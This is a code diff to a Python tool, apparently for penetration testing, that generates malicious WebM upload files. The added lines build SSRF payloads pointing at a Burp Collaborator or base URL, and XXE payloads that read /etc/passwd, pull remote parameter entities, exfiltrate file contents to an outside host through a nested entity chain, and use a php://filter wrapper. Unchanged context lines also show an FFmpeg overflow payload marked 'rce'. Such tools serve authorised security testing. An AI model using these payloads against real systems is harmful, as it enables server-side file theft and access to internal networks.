@@ -177,6 +177,18 @@ def generate_webm_payloads(output_dir, burp_collab, tech_filter='all', payload_t
     if should_generate_type('ssrf'):
         with open(ssrf_dir / "ssrf2_m3u8_playlist.webm", 'wb') as f:
             f.write(webm_ssrf2_m3u8_playlist)
+        
+        webm_ssrf3_https_ebml = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + f'https://{burp_collab}/ssrf-https-ebml'.encode('utf-8') + b'\x00' * 1000
+        with open(ssrf_dir / "ssrf3_https_ebml.webm", 'wb') as f:
+            f.write(webm_ssrf3_https_ebml)
+        
+        webm_ssrf4_metadata_url = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + f'<metadata><url>{base_url}/ssrf-metadata</url></metadata>'.encode('utf-8') + b'\x00' * 1000
+        with open(ssrf_dir / "ssrf4_metadata_url.webm", 'wb') as f:
+            f.write(webm_ssrf4_metadata_url)
+        
+        webm_ssrf5_thumbnail = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + f'<thumbnail src="{base_url}/ssrf-thumbnail"></thumbnail>'.encode('utf-8') + b'\x00' * 1000
+        with open(ssrf_dir / "ssrf5_thumbnail.webm", 'wb') as f:
+            f.write(webm_ssrf5_thumbnail)
     
     webm_xxe1_timed_text = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + f'''<?xml version="1.0"?>
 <!DOCTYPE tt [
@@ -191,6 +203,60 @@ def generate_webm_payloads(output_dir, burp_collab, tech_filter='all', payload_t
     if should_generate_type('xxe'):
         with open(xxe_dir / "xxe1_timed_text.webm", 'wb') as f:
             f.write(webm_xxe1_timed_text)
+        
+        webm_xxe2_file = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + f'''<?xml version="1.0"?>
+<!DOCTYPE tt [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<tt xmlns="http://www.w3.org/ns/ttml">
+<body>
+<p>&xxe;</p>
+</body>
+</tt>'''.encode('utf-8') + b'\x00' * 1000
+        with open(xxe_dir / "xxe2_file.webm", 'wb') as f:
+            f.write(webm_xxe2_file)
+        
+        webm_xxe3_parameter = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + f'''<?xml version="1.0"?>
+<!DOCTYPE tt [
+<!ENTITY % xxe SYSTEM "{base_url}/xxe-webm-param">
+%xxe;
+]>
+<tt xmlns="http://www.w3.org/ns/ttml">
+<body>
+<p>test</p>
+</body>
+</tt>'''.encode('utf-8') + b'\x00' * 1000
+        with open(xxe_dir / "xxe3_parameter.webm", 'wb') as f:
+            f.write(webm_xxe3_parameter)
+        
+        webm_xxe4_nested = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + f'''<?xml version="1.0"?>
+<!DOCTYPE tt [
+<!ENTITY % remote SYSTEM "{base_url}/xxe-webm-nested">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{base_url}/xxe-webm-exfil?data=%file;'>">
+%remote;
+%eval;
+%exfil;
+]>
+<tt xmlns="http://www.w3.org/ns/ttml">
+<body>
+<p>test</p>
+</body>
+</tt>'''.encode('utf-8') + b'\x00' * 1000
+        with open(xxe_dir / "xxe4_nested.webm", 'wb') as f:
+            f.write(webm_xxe4_nested)
+        
+        webm_xxe5_php_wrapper = ebml_header + b'\x42\x86' + b'\x81' + b'\x20' + f'''<?xml version="1.0"?>
+<!DOCTYPE tt [
+<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource={base_url}/xxe-webm-php">
+]>
+<tt xmlns="http://www.w3.org/ns/ttml">
+<body>
+<p>&xxe;</p>
+</body>
+</tt>'''.encode('utf-8') + b'\x00' * 1000
+        with open(xxe_dir / "xxe5_php_wrapper.webm", 'wb') as f:
+            f.write(webm_xxe5_php_wrapper)
     
     webm_rce4_ffmpeg_overflow = ebml_header + b'\x42\x86' + b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF' + b'\x9D\x01\x2A' + b'A' * 100000
     if should_generate_type('rce'):
